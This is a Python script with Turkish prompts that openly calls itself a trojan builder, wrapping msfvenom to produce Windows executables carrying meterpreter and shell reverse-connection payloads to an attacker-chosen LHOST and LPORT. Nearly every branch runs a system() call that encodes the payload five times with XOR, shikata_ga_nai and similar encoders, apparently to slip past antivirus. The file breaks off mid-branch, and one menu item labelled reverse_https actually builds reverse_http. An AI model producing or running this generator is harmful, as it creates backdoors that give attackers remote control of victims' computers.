#!/bin/avr/env python


import time
from os import system
import os
import pyfiglet



BLUE, RED, WHITE, CYAN, DEFAULT, YELLOW, MAGENTA, GREEN, END, BOLD = '\33[94m', '\033[91m', '\33[97m', '\033[36m', '\033[0m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m', '\033[1m'
system('clear')
print(f"""
{BOLD}{RED} __  __ ____  _____{BOLD}{YELLOW}__     __                        
{BOLD}{RED}|  \/  / ___||  ___{BOLD}{YELLOW}\ \   / /__ _ __   ___  _ __ ___ 
{BOLD}{RED}| |\/| \___ \| |_  {BOLD}{YELLOW} \ \ / / _ \ '_ \ / _ \| '_ ` _ \ 
{BOLD}{RED}| |  | |___) |  _| {BOLD}{YELLOW}  \ V /  __/ | | | (_) | | | | | | 
{BOLD}{RED}|_|  |_|____/|_|   {BOLD}{YELLOW}   \_/ \___|_| |_|\___/|_| |_| |_|
                                                                
""")
print(f'{BOLD}{BLUE}===============================================')
print(f'{BOLD}{WHITE}[01] {BOLD}{YELLOW}WINDOWS --> {BOLD}{GREEN}test.exe')
print(f'{WHITE}[02] {YELLOW}ANDROID --> {GREEN}test.apk')
print(f'{BLUE}===============================================')


secenek1 = input(f'{CYAN}Hangi sisteme trojan yazmak istersiniz{RED}:  ')
secenek1 = secenek1.zfill(2)
print(f'{BLUE}===============================================')
if secenek1 == '01':
    print(f'{WHITE}[01] {MAGENTA}windows/x64/meterpreter_reverse_http')
    print(f'{WHITE}[02] {MAGENTA}windows/x64/meterpreter_reverse_https')
    print(f'{WHITE}[03] {MAGENTA}windows/x64/meterpreter_reverse_tcp')
    print(f'{WHITE}[04] {MAGENTA}windows/x64/meterpreter/reverse_tcp')
    print(f'{WHITE}[05] {MAGENTA}windows/x64/powershell_reverse_tcp')
    print(f'{WHITE}[06] {MAGENTA}windows/x64/shell_reverse_tcp')
    print(f'{WHITE}[07] {MAGENTA}windows/meterpreter_reverse_http')
    print(f'{WHITE}[08] {MAGENTA}windows/meterpreter_reverse_https')
    print(f'{WHITE}[09] {MAGENTA}windows/meterpreter_reverse_tcp')
    print(f'{WHITE}[10] {MAGENTA}windows/meterpreter/reverse_tcp')
    print(f'{WHITE}[11] {MAGENTA}windows/meterpreter/reverse_tcp_dns')
    print(f'{WHITE}[12] {MAGENTA}windows/metsvc_reverse_tcp')
    print(f'{WHITE}[13] {MAGENTA}windows/powershell_reverse_tcp')
    print(f'{WHITE}[14] {MAGENTA}windows/shell_reverse_tcp')
    print(f'{BLUE}===============================================')
    payload = input(f'{CYAN}Payload türünü seçiniz{RED}:  ')
    payload = payload.zfill(2)
    print(f'{BLUE}===============================================')    
    if payload == '':
        print(f'{BLUE}===============================================')
        print(f'{RED}HATALI TUŞLAMA!')
        print(f'{BLUE}===============================================')
##################################################################
    elif payload == '01':
        p1 = 'windows/x64/meterpreter_reverse_http'
        lhost = input(f'{CYAN}LHOST{RED}:  ')
        lport = input(f'{CYAN}LPORT{RED}:  ')
        payloadname = input(f'{CYAN}Payloadınıza bir isim verin{RED}(test.exe):  ')
        print(f'{BLUE}===============================================')
        print(f'{WHITE}[01] {MAGENTA}x64/xor')
        print(f'{WHITE}[02] {MAGENTA}x64/xor_context')
        print(f'{WHITE}[03] {MAGENTA}x64/xor_dynamic')
        print(f'{WHITE}[04] {MAGENTA}x64/zutto_dekiru')
        print(f'{BLUE}===============================================')
        encoder = input(f'{CYAN}Payloadınıza bir encoder belirleyin{RED}:  ')
        print(f'{BLUE}===============================================')
        encoder = encoder.zfill(2)
        if encoder == '01':
            e1 = 'x64/xor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            time.sleep(3)
            system(f'msfvenom -p {p1} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e1} -i 5')
        elif encoder == '02':
            e2 = 'x64/xor_context'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            time.sleep(3)
            system(f'msfvenom -p {p1} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e2} -i 5')
        elif encoder == '03':
            e3 = 'x64/xor_dynamic'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            time.sleep(3)
            system(f'msfvenom -p {p1} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e3} -i 5')
        elif encoder == '04':
            e4 = 'x64/zutto_dekiru'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            time.sleep(3)
            system(f'msfvenom -p {p1} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e4} -i 5')
        else:
            print(f'{BLUE}===============================================')
            print(f'{RED}HATALI TUŞLAMA!')
            print(f'{BLUE}===============================================')
##################################################################   
    elif payload == '02':
        p2 = 'windows/x64/meterpreter_reverse_https'
        lhost = input(f'{CYAN}LHOST{RED}:  ')
        lport = input(f'{CYAN}LPORT{RED}:  ')
        payloadname = input(f'{CYAN}Payloadınıza bir isim verin{RED}(test.exe):  ')
        print(f'{BLUE}===============================================')
        print(f'{WHITE}[01] {MAGENTA}x64/xor')
        print(f'{WHITE}[02] {MAGENTA}x64/xor_context')
        print(f'{WHITE}[03] {MAGENTA}x64/xor_dynamic')
        print(f'{WHITE}[04] {MAGENTA}x64/zutto_dekiru')
        print(f'{BLUE}===============================================')
        encoder = input(f'{CYAN}Payloadınıza bir encoder belirleyin{RED}:  ')
        print(f'{BLUE}===============================================')
        encoder = encoder.zfill(2)
        if encoder == '01':
            e1 = 'x64/xor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p2} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e1} -i 5')
        elif encoder == '02':
            e2 = 'x64/xor_context'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p2} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e2} -i 5')
        elif encoder == '03':
            e3 = 'x64/xor_dynamic'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p2} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e3} -i 5')
        elif encoder == '04':
            e4 = 'x64/zutto_dekiru'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p2} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e4} -i 5')
        else:
            print(f'{BLUE}===============================================')
            print(f'{RED}HATALI TUŞLAMA!')
            print(f'{BLUE}===============================================')
##################################################################
    elif payload == '03':
        p3 = 'windows/x64/meterpreter_reverse_tcp'
        lhost = input(f'{CYAN}LHOST{RED}:  ')
        lport = input(f'{CYAN}LPORT{RED}:  ')
        payloadname = input(f'{CYAN}Payloadınıza bir isim verin{RED}(test.exe):  ')
        print(f'{BLUE}===============================================')
        print(f'{WHITE}[01] {MAGENTA}x64/xor')
        print(f'{WHITE}[02] {MAGENTA}x64/xor_context')
        print(f'{WHITE}[03] {MAGENTA}x64/xor_dynamic')
        print(f'{WHITE}[04] {MAGENTA}x64/zutto_dekiru')
        print(f'{BLUE}===============================================')
        encoder = input(f'{CYAN}Payloadınıza bir encoder belirleyin{RED}:  ')
        print(f'{BLUE}===============================================')
        encoder = encoder.zfill(2)
        if encoder == '01':
            e1 = 'x64/xor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p3} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e1} -i 5')
        elif encoder == '02':
            e2 = 'x64/xor_context'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p3} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e2} -i 5')
        elif encoder == '03':
            e3 = 'x64/xor_dynamic'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p3} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e3} -i 5')
        elif encoder == '04':
            e4 = 'x64/zutto_dekiru'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p3} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e4} -i 5')
        else:
            print(f'{BLUE}===============================================')
            print(f'{RED}HATALI TUŞLAMA!')
            print(f'{BLUE}===============================================')
##################################################################
    elif payload == '04':
        p4 = 'windows/x64/meterpreter/reverse_tcp'
        lhost = input(f'{CYAN}LHOST{RED}:  ')
        lport = input(f'{CYAN}LPORT{RED}:  ')
        payloadname = input(f'{CYAN}Payloadınıza bir isim verin{RED}(test.exe):  ')
        print(f'{BLUE}===============================================')
        print(f'{WHITE}[01] {MAGENTA}x64/xor')
        print(f'{WHITE}[02] {MAGENTA}x64/xor_context')
        print(f'{WHITE}[03] {MAGENTA}x64/xor_dynamic')
        print(f'{WHITE}[04] {MAGENTA}x64/zutto_dekiru')
        print(f'{BLUE}===============================================')
        encoder = input(f'{CYAN}Payloadınıza bir encoder belirleyin{RED}:  ')
        encoder = encoder.zfill(2)
        print(f'{BLUE}===============================================')
        if encoder == '01':
            e1 = 'x64/xor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p4} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e1} -i 5')
        elif encoder == '02':
            e2 = 'x64/xor_context'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p4} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e2} -i 5')
        elif encoder == '03':
            e3 = 'x64/xor_dynamic'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p4} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e3} -i 5')
        elif encoder == '04':
            e4 = 'x64/zutto_dekiru'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p4} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e4} -i 5')
        else:
            print(f'{BLUE}===============================================')
            print(f'{RED}HATALI TUŞLAMA!')
            print(f'{BLUE}===============================================')
##################################################################
    elif payload == '05':
        p5 = 'windows/x64/powershell_reverse_tcp'
        lhost = input(f'{CYAN}LHOST{RED}:  ')
        lport = input(f'{CYAN}LPORT{RED}:  ')
        payloadname = input(f'{CYAN}Payloadınıza bir isim verin{RED}(test.exe):  ')
        print(f'{BLUE}===============================================')
        print(f'{WHITE}[01] {MAGENTA}x64/xor')
        print(f'{WHITE}[02] {MAGENTA}x64/xor_context')
        print(f'{WHITE}[03] {MAGENTA}x64/xor_dynamic')
        print(f'{WHITE}[04] {MAGENTA}x64/zutto_dekiru')
        print(f'{BLUE}===============================================')
        encoder = input(f'{CYAN}Payloadınıza bir encoder belirleyin{RED}:  ')
        encoder = encoder.zfill(2)
        print(f'{BLUE}===============================================')
        if encoder == '01':
            e1 = 'x64/xor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p5} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e1} -i 5')
        elif encoder == '02':
            e2 = 'x64/xor_context'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p5} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e2} -i 5')
        elif encoder == '03':
            e3 = 'x64/xor_dynamic'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p5} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e3} -i 5')
        elif encoder == '04':
            e4 = 'x64/zutto_dekiru'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p5} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e4} -i 5')
        else:
            print(f'{BLUE}===============================================')
            print(f'{RED}HATALI TUŞLAMA!')
            print(f'{BLUE}===============================================')
##################################################################
    elif payload == '06':
        p6 = 'windows/x64/shell_reverse_tcp'
        lhost = input(f'{CYAN}LHOST{RED}:  ')
        lport = input(f'{CYAN}LPORT{RED}:  ')
        payloadname = input(f'{CYAN}Payloadınıza bir isim verin{RED}(test.exe):  ')
        print(f'{BLUE}===============================================')
        print(f'{WHITE}[01] {MAGENTA}x64/xor')
        print(f'{WHITE}[02] {MAGENTA}x64/xor_context')
        print(f'{WHITE}[03] {MAGENTA}x64/xor_dynamic')
        print(f'{WHITE}[04] {MAGENTA}x64/zutto_dekiru')
        print(f'{BLUE}===============================================')
        encoder = input(f'{CYAN}Payloadınıza bir encoder belirleyin{RED}:  ')
        encoder = encoder.zfill(2)
        print(f'{BLUE}===============================================')
        if encoder == '01':
            e1 = 'x64/xor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p6} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e1} -i 5')
        elif encoder == '02':
            e2 = 'x64/xor_context'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p6} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e2} -i 5')
        elif encoder == '03':
            e3 = 'x64/xor_dynamic'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p6} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e3} -i 5')
        elif encoder == '04':
            e4 = 'x64/zutto_dekiru'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p6} LHOST={lhost} LPORT={lport} -f exe -a x64 -o {payloadname} --platform windows -e {e4} -i 5')
        else:
            print(f'{BLUE}===============================================')
            print(f'{RED}HATALI TUŞLAMA!')
            print(f'{BLUE}===============================================')
##################################################################
    elif payload == '07':
        p7 = 'windows/meterpreter_reverse_http'
        lhost = input(f'{CYAN}LHOST{RED}:  ')
        lport = input(f'{CYAN}LPORT{RED}:  ')
        payloadname = input(f'{CYAN}Payloadınıza bir isim verin{RED}(test.exe):  ')
        print(f'{BLUE}===============================================')
        print(f'{WHITE}[01] {MAGENTA}x86/add_sub')
        print(f'{WHITE}[02] {MAGENTA}x86/alpha_mixed')
        print(f'{WHITE}[03] {MAGENTA}x86/alpha_upper')
        print(f'{WHITE}[04] {MAGENTA}x86/avoid_underscore_tolower')
        print(f'{WHITE}[05] {MAGENTA}x86/avoid_utf8_tolower')
        print(f'{WHITE}[06] {MAGENTA}x86/bloxor')
        print(f'{WHITE}[07] {MAGENTA}x86/bmp_polyglot')
        print(f'{WHITE}[08] {MAGENTA}x86/call4_dword_xor')
        print(f'{WHITE}[09] {MAGENTA}x86/context_cpuid')
        print(f'{WHITE}[10] {MAGENTA}x86/context_stat')
        print(f'{WHITE}[11] {MAGENTA}x86/context_time')
        print(f'{WHITE}[12] {MAGENTA}x86/countdown')
        print(f'{WHITE}[13] {MAGENTA}x86/fnstenv_mov')
        print(f'{WHITE}[14] {MAGENTA}x86/jmp_call_additive')
        print(f'{WHITE}[15] {MAGENTA}x86/nonalpha')
        print(f'{WHITE}[16] {MAGENTA}x86/nonupper')
        print(f'{WHITE}[17] {MAGENTA}x86/opt_sub')
        print(f'{WHITE}[18] {MAGENTA}x86/service')
        print(f'{WHITE}[19] {MAGENTA}x86/shikata_ga_nai')
        print(f'{WHITE}[20] {MAGENTA}x86/single_static_bit')
        print(f'{WHITE}[21] {MAGENTA}x86/unicode_mixed')
        print(f'{WHITE}[22] {MAGENTA}x86/unicode_upper')
        print(f'{WHITE}[23] {MAGENTA}x86/xor_dynamic')
        print(f'{BLUE}===============================================')
        encoder = input(f'{CYAN}Payloadınıza bir encoder belirleyin{RED}:  ')
        encoder = encoder.zfill(2)
        print(f'{BLUE}===============================================')
        if encoder == '01':
            e1 = 'x86/add_sub'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e1} -i 5')
        elif encoder == '02':
            e2 = 'x86/alpha_mixed'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e2} -i 5')
        elif encoder == '03':
            e3 = 'x86/alpha_upper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e3} -i 5')
        elif encoder == '04':
            e4 = 'x86/avoid_underscore_tolower'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e4} -i 5')
        elif encoder == '05':
            e5 = 'x86/avoid_utf8_tolower'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e5} -i 5')
        elif encoder == '06':
            e6 = 'x86/bloxor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e6} -i 5')
        elif encoder == '07':
            e7 = 'x86/bmp_polyglot'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e7} -i 5')
        elif encoder == '08':
            e8 = 'x86/call4_dword_xor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e8} -i 5')
        elif encoder == '09':
            e9 = 'x86/context_cpuid'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e9} -i 5')
        elif encoder == '10':
            e10 = 'x86/context_stat'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e10} -i 5')
        elif encoder == '11':
            e11 = 'x86/context_time'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e11} -i 5')
        elif encoder == '12':
            e12 = 'x86/countdown'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e12} -i 5')
        elif encoder == '13':
            e13 = 'x86/fnstenv_mov'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e13} -i 5')
        elif encoder == '14':
            e14 = 'x86/jmp_call_additive'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e14} -i 5')
        elif encoder == '15':
            e15 = 'x86/nonalpha'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e15} -i 5')
        elif encoder == '16':
            e16 = 'x86/nonupper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e16} -i 5')
        elif encoder == '17':
            e17 = 'x86/opt_sub'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e17} -i 5')
        elif encoder == '18':
            e18 = 'x86/service'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e18} -i 5')
        elif encoder == '19':
            e19 = 'x86/shikata_ga_nai'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e19} -i 5')
        elif encoder == '20':
            e20 = 'x86/single_static_bit'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e20} -i 5')
        elif encoder == '21':
            e21 = 'x86/unicode_mixed'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e21} -i 5')
        elif encoder == '22':
            e22 = 'x86/unicode_upper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e22} -i 5')
        elif encoder == '23':
            e23 = 'x86/xor_dynamic'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p7} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e23} -i 5')
        else:
            print(f'{BLUE}===============================================')
            print(f'{RED}HATALI TUŞLAMA!')
            print(f'{BLUE}===============================================')
##################################################################
    elif payload == '08':
        p8 = 'windows/meterpreter_reverse_http'
        lhost = input(f'{CYAN}LHOST{RED}:  ')
        lport = input(f'{CYAN}LPORT{RED}:  ')
        payloadname = input(f'{CYAN}Payloadınıza bir isim verin{RED}(test.exe):  ')
        print(f'{BLUE}===============================================')
        print(f'{WHITE}[01] {MAGENTA}x86/add_sub')
        print(f'{WHITE}[02] {MAGENTA}x86/alpha_mixed')
        print(f'{WHITE}[03] {MAGENTA}x86/alpha_upper')
        print(f'{WHITE}[04] {MAGENTA}x86/avoid_underscore_tolower')
        print(f'{WHITE}[05] {MAGENTA}x86/avoid_utf8_tolower')
        print(f'{WHITE}[06] {MAGENTA}x86/bloxor')
        print(f'{WHITE}[07] {MAGENTA}x86/bmp_polyglot')
        print(f'{WHITE}[08] {MAGENTA}x86/call4_dword_xor')
        print(f'{WHITE}[09] {MAGENTA}x86/context_cpuid')
        print(f'{WHITE}[10] {MAGENTA}x86/context_stat')
        print(f'{WHITE}[11] {MAGENTA}x86/context_time')
        print(f'{WHITE}[12] {MAGENTA}x86/countdown')
        print(f'{WHITE}[13] {MAGENTA}x86/fnstenv_mov')
        print(f'{WHITE}[14] {MAGENTA}x86/jmp_call_additive')
        print(f'{WHITE}[15] {MAGENTA}x86/nonalpha')
        print(f'{WHITE}[16] {MAGENTA}x86/nonupper')
        print(f'{WHITE}[17] {MAGENTA}x86/opt_sub')
        print(f'{WHITE}[18] {MAGENTA}x86/service')
        print(f'{WHITE}[19] {MAGENTA}x86/shikata_ga_nai')
        print(f'{WHITE}[20] {MAGENTA}x86/single_static_bit')
        print(f'{WHITE}[21] {MAGENTA}x86/unicode_mixed')
        print(f'{WHITE}[22] {MAGENTA}x86/unicode_upper')
        print(f'{WHITE}[23] {MAGENTA}x86/xor_dynamic')
        print(f'{BLUE}===============================================')
        encoder = input(f'{CYAN}Payloadınıza bir encoder belirleyin{RED}:  ')
        encoder = encoder.zfill(2)
        print(f'{BLUE}===============================================')
        if encoder == '01':
            e1 = 'x86/add_sub'
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e1} -i 5')
        elif encoder == '02':
            e2 = 'x86/alpha_mixed'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e2} -i 5')
        elif encoder == '03':
            e3 = 'x86/alpha_upper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e3} -i 5')
        elif encoder == '04':
            e4 = 'x86/avoid_underscore_tolower'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e4} -i 5')
        elif encoder == '05':
            e5 = 'x86/avoid_utf8_tolower'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e5} -i 5')
        elif encoder == '06':
            e6 = 'x86/bloxor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e6} -i 5')
        elif encoder == '07':
            e7 = 'x86/bmp_polyglot'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e7} -i 5')
        elif encoder == '08':
